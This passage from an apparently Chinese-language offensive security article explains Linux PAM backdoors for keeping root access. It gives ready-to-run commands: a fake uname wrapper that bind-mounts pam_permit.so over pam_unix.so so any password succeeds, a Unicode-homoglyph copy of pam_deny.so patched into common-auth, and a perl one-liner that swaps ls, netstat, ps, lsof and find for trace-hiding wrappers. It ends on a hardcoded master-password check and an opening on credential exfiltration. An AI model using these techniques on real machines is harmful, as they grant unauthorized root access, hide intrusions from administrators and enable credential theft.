     */
    #define PAM_SM_AUTH
    #define PAM_SM_ACCOUNT
    #define PAM_SM_SESSION
    #define PAM_SM_PASSWORD
    #include 
    #include 
    /* --- authentication management functions --- */
    PAM_EXTERN int
    pam_sm_authenticate(pam_handle_t *pamh, int flags UNUSED,
                        int argc UNUSED, const char **argv UNUSED)
    {
        int retval;
        const char *user=NULL;
        /*
         * authentication requires we know who the user wants to be
         */
        retval = pam_get_user(pamh, &user, NULL);
        if (retval != PAM_SUCCESS) {
            D(("get user returned error: %s", pam_strerror(pamh,retval)));
            return retval;
        }
        if (user == NULL || *user == '\0') {
            D(("username not known"));
            retval = pam_set_item(pamh, PAM_USER, (const void *) DEFAULT_USER);
            if (retval != PAM_SUCCESS)
                return PAM_USER_UNKNOWN;
        }
        user = NULL;                                            /* clean up */
        return PAM_SUCCESS;
    }
    PAM_EXTERN int
    pam_sm_setcred(pam_handle_t *pamh UNUSED, int flags UNUSED,
                   int argc UNUSED, const char **argv UNUSED)
    {
         return PAM_SUCCESS;
    }
    /* --- account management functions --- */
    PAM_EXTERN int
    pam_sm_acct_mgmt(pam_handle_t *pamh UNUSED, int flags UNUSED,
                     int argc UNUSED, const char **argv UNUSED)
    {
         return PAM_SUCCESS;
    }
    /* --- password management --- */
    PAM_EXTERN int
    pam_sm_chauthtok(pam_handle_t *pamh UNUSED, int flags UNUSED,
                     int argc UNUSED, const char **argv UNUSED)
    {
         return PAM_SUCCESS;
    }
    /* --- session management --- */
    PAM_EXTERN int
    pam_sm_open_session(pam_handle_t *pamh UNUSED, int flags UNUSED,
                        int argc UNUSED, const char **argv UNUSED)
    {
        return PAM_SUCCESS;
    }
    PAM_EXTERN int
    pam_sm_close_session(pam_handle_t *pamh UNUSED, int flags UNUSED,
                         int argc UNUSED, const char **argv UNUSED)
    {
         return PAM_SUCCESS;
    }
    /* end of module definition */
    #ifdef PAM_STATIC
    /* static module data */
    struct pam_module _pam_permit_modstruct = {
        "pam_permit",
        pam_sm_authenticate,
        pam_sm_setcred,
        pam_sm_acct_mgmt,
        pam_sm_open_session,
        pam_sm_close_session,
        pam_sm_chauthtok
    };
    #endif
所以在留pam后门时也可以利用这个"永真"的so来达到权限维持。
* * *
### 挂载+优先级后门
当我们运行shell脚本时候系统将顺序尝试在PATH环境变量的所有目录中查找该命令。如果两个不同的PATH条目中有两个匹配的可执行文件，则将使用第一个而不触发任何警告。因此，如果我们在第一个PATH条目中添加了一个恶意二进制文件，而合法的二进制文件则位于PATH的后面，则使用恶意二进制文件代替原始二进制文件。
所以我们可以利用路径优先级结合使用 **mount** 连接原so和替换的恶意so文件来耍点"小聪明",这里将 **/usr/bin/uname**
写个wrapper script:
    #!/bin/sh
    mount --bind /lib/*/*/pam_permit.so /lib/*/*/pam_unix.so 2>/dev/null
    /bin/uname $*
这样就用 **pam_permit.so** 来替代加载了 **pam_unix.so**.
原因就在于 **/usr/bin** 默认优先于 **/bin** 路径
    qing@ubuntu:/usr/bin$ cat uname
    #!/bin/sh
    mount --bind /lib64/security/pam_permit.so /lib64/security/pam_unix.so 2>/dev/null
    /bin/uname $*
    qing@ubuntu:/usr/bin$ uname -a
    Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    qing@ubuntu:/usr/bin$
可以发现随便输入密码都是ok的 以及以低用户权限切root也是无密:
这样相当于万能密码， **/dev/null**
重定向标准错误也是为了低权限用户执行mount因权限不够出错的问题，这样就算不是root用户执行uname在最后执行原 **/bin/uname**
没有任何影响。种植后任何调用uname的脚本都会触发 **pam_permit.so** ，并且我们没有修改原 **pam** 的任何文件。
uname只是一个简单的例子，shell脚本中可以使用无数的命令，具体要用替换来长期维权需要替换什么师傅们也能想到。
需要注意的一个的小地方是上面的例子是在 **Linux ubuntu 4.4.0-142-generic**
进行，而你在Centos这种红帽中PATH又是不一样的，具体环境具体替换即可。
### 同形异义字后门
**/etc/pam.d/** 下来管理对程序的认证方式。
应用程序会调用相应的配置文件,从而调用本地的认证模块，模块放置在 **/lib/security**
下,以加载动态库的形式进，像我们使用su命令时,系统会提示你输入root用户的密码.这就是su命令通过调用 **PAM** 模块实现的.
    qing@ubuntu:/usr/bin$ ls -alh /etc/pam.d/
    total 92K
    drwxr-xr-x  2 root root 4.0K May 13 02:17 .
    drwxr-xr-x 97 root root 4.0K May 21 05:26 ..
    -rw-r--r--  1 root root  384 Nov 12  2015 chfn
    -rw-r--r--  1 root root   92 Nov 12  2015 chpasswd
    -rw-r--r--  1 root root  581 Nov 12  2015 chsh
    -rw-r--r--  1 root root 1.2K Apr  7 05:15 common-account
    -rw-r--r--  1 root root 1.2K Apr  7 05:15 common-auth
    -rw-r--r--  1 root root 1.5K Apr  7 05:15 common-password
    -rw-r--r--  1 root root 1.5K Apr  7 05:15 common-session
    -rw-r--r--  1 root root 1.5K Apr  7 05:15 common-session-noninteractive
    -rw-r--r--  1 root root  606 Apr  5  2016 cron
    -rw-r--r--  1 root root 4.8K Jan 29  2016 login
    -rw-r--r--  1 root root   92 Nov 12  2015 newusers
    -rw-r--r--  1 root root  520 Mar 16  2016 other
    -rw-r--r--  1 root root   92 Nov 12  2015 passwd
    -rw-r--r--  1 root root  143 Mar 12  2016 runuser
    -rw-r--r--  1 root root  138 Mar 12  2016 runuser-l
    -rw-r--r--  1 root root  454 Jan 13  2018 smtp
    -rw-r--r--  1 root root 2.1K Mar  4  2019 sshd
    -rw-r--r--  1 root root 2.3K Nov 12  2015 su
    -rw-r--r--  1 root root  239 Mar 30  2016 sudo
    -rw-r--r--  1 root root  251 Apr 12  2016 systemd-user
看文件之前先看下配置文件的规则，例如 **/etc/pam.d/sshd** (省略号为无关内容)：
    qing@ubuntu:/usr/bin$ cat /etc/pam.d/sshd
    # PAM configuration for the Secure Shell service
    # Standard Un*x authentication.
    @include common-auth
    ...
    account    required     pam_nologin.so
    ...
    @include common-account
    ...
    session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
    # Set the loginuid process attribute.
    session    required     pam_loginuid.so
    ..
    session    optional     pam_keyinit.so force revoke
    ..
    @include common-session
    ..
    session    optional     pam_motd.so  motd=/run/motd.dynamic
    session    optional     pam_motd.so noupdate
    ..
    session    optional     pam_mail.so standard noenv # [1]
    ..
    session    required     pam_limits.so
    ..
    session    required     pam_env.so # [1]
    ..
    session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
    ...
    session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open
    # Standard Un*x password updating.
    @include common-password
第一列代表模块类型
第二列代表控制标记
第三列代表模块路径
第四列代表模块参数
而模块又分四种，具体可以百度，这里对于后门做手脚还是关注 **认证管理(auth)** 模块。
查看认证 **/etc/pam.d/common-auth** ，可以发现auth模块和对应标记控制、调用的模块、传递的参数:
从文件中控制标记可以看出验证的逻辑顺序（ **required** 表示即使某个模块对用户的验证失败, **requisite**
也是表示返回失败,立刻向应用程序返回失败,表示此类型失败.不再进行同类型后面的操作.）,为这里 **suucces=1**
的表示验证密码成功然后接下来去调用 **pam_unix.so** (跳过调用 **pam_deny.so** ),如果验证失败则会去调用
**pam_deny.so** ,
那在不知道认证密码的情况下必然是认证失败，如果失败调用的这个 **pam_deny.so** 为恶意文件或者为返回结果为真的
**pam_permit.so** 都可以达到一个后门的效果，这里就可以用到同形异字Unicode字符来做个后门:
    cp /lib/*/*/pam_permit.so /lib/x86_64-linux-gnu/security/pam_de$'\u578'y.so
这里 **de** 后面的并不是正常的 **n** ,而是用Unicode字符u+578来替代，虽然他看来和正常的 **n** 很像，
所以在认证文件替换响应的字符，这样调用的时候会调用我们创建含unicode字符的so，最后还是会调用到 **pam_permit.so**
使认证结果返回正确，而不是原认证文件。
    perl -i -pe's/deny/de\x{578}y/' /etc/pam.d/common-auth
类似的还可以使用相同名称的shell脚本来替换ls、netstat、ps等命令，不过不推荐:
    which ls netstat ps lsof find|perl -pe'$s="\x{455}";$n="\x{578}";chop;$o=$_;s/([ltp])s/\1$s/||s/fin/fi$n/;rename$o,$_;open F,">$o";print F"#!/bin/sh\n$_ \$*|grep -vE \"[$s-$n]|grep|177\"";chmod 493,$o'
## 0x03 PAM-BackDoor-exfiltration
在更改pam_unix_auth时候可以指定将密码写入tmp目录文件来记录密码，除此我们也可使用数据带外的方式来达到用后门收集一些有效凭证、敏感密码之类的信息。
这时候我们在看来一般的PAM后门种植过程中对于密码的记录:
    if(strcmp(p,"qing")==0)
    {
            retval = PAM_SUCCESS;
    }
    if(retval== PAM_SUCCESS)
    {